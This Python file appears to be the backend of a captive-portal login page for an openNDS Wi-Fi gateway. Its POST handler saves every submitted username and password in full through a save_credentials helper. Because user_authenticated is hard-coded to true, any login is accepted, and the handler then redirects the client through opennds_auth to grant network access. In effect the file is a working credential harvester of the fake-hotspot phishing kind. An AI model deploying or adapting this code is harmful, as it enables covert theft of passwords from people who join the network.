from http.server import SimpleHTTPRequestHandler
import socketserver
import urllib.parse
from credentials.json_save import save_credentials


port = 8000

ip_to_params = {}
class Server(SimpleHTTPRequestHandler):
    def do_GET(self):
        url = urllib.parse.urlparse(self.path)
        ip = self.address_string()

        print("GET from " + ip + " for " + url.path)

        params = urllib.parse.parse_qs(url.query)
        if "tok" in params and "redir" in params:
            auth_param = urllib.parse.urlencode({"tok": params["tok"][0], "redir": params["redir"][0]})
            print(auth_param)
            ip_to_params[ip] = auth_param

        return SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = bytes.decode(self.rfile.read(content_length))

        query = urllib.parse.parse_qs(data)
        ip = self.address_string()

        username = query.get("username", [""])[0]
        password = query.get("password", [""])[0]

        print(f"POST from {ip} to log in with username: '{username}' and password: '{password[0:4] + (len(password) - 4)*'*'}'")
        print("Saving credentials...")

        save_credentials(username, password)

        # THIS IS WHERE YOU WOULD CHECK THE USER CREDENTIALS
        user_authenticated = True
        
        if user_authenticated:
            url = "http://10.0.0.1:2050/opennds_auth/?" + ip_to_params.get(ip, "")
            
            print("AUTH valid, REDIRECT to " + url)

            self.send_response(302)
            self.send_header('Location', url)
            self.end_headers()
            return

        else:
            print("AUTH invalid, sending alert")

            self.send_response(302)
            self.send_header('Location', "http://10.0.0.1:8000/?statusCode=4")
            self.end_headers()
            return

    # Disabling log messages
    def log_message(self, format, *args):
        pass


socketserver.TCPServer.allow_reuse_address = True
webServer = socketserver.TCPServer(("", port), Server)

try:
    print("Server started http://localhost:" + str(port))
    webServer.serve_forever()
except KeyboardInterrupt:
    webServer.server_close()
    print("\nServer stopped.")